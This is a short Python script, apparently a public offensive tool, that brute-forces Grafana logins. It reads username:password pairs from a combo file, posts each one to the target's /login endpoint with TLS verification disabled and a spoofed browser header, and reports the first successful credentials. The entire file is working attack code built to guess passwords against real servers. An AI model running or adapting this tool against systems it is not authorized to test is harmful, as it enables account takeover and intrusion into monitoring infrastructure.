#!/usr/bin/env python
#
#
# grafana-brute.py
# Read from a list of combinations for logins for grafana
# 
# Author: RandomRobbieBF

import requests
import json
import argparse
import sys
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()

# Proxy to be left blank if not required.
http_proxy = ""
proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }



def main(args):
	try:
		with open(args.file) as f:
			for line in f:
				url = args.url
				line = line.replace("\n","")
				combo = line.split(":")
				user = combo[0]
				password = combo[1]
				headers = {"User-Agent":"curl/7.64.1","Connection":"close","Accept":"*/*"}
				response = session.get(""+url+"/login",headers=headers, verify=False,timeout=10,proxies=proxyDict)
				if response.status_code != 200:
					print ("http response was not 200 ok please check url")
					sys.exit(1)
				rawBody = "{\"user\":\""+user+"\",\"email\":\"\",\"password\":\""+password+"\"}"
				headers2 = {"Origin":""+url+"","Accept":"application/json, text/plain, */*","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0","Connection":"close","Referer":""+url+"/login","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate","Content-Type":"application/json;charset=utf-8"}
				response2 = session.post(""+url+"/login", data=rawBody, headers=headers2, verify=False,timeout=10,proxies=proxyDict)
				if response2.status_code != 200:
					if response2.status_code == 401:
						print ("Username: "+user+" Password:"+password+" Failed")
				if response2.status_code == 200:
					if "Logged in" in response2.text:
						print ("Username: "+user+" Password:"+password+" Sucessful")
						sys.exit(0)
					else:
						print ("Username: "+user+" Password:"+password+" Failed - Check Proxy for response to see why.")
						
						
						
	except IOError:
		print("File not accessible")
		sys.exit(1)
		
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
	except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)                  




if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument("-u", "--url", required=True, help="Grafana Url")
	parser.add_argument("-f", "--file", required=False, default="combo.txt", help="Combo File")
	args = parser.parse_args()
	main(args)
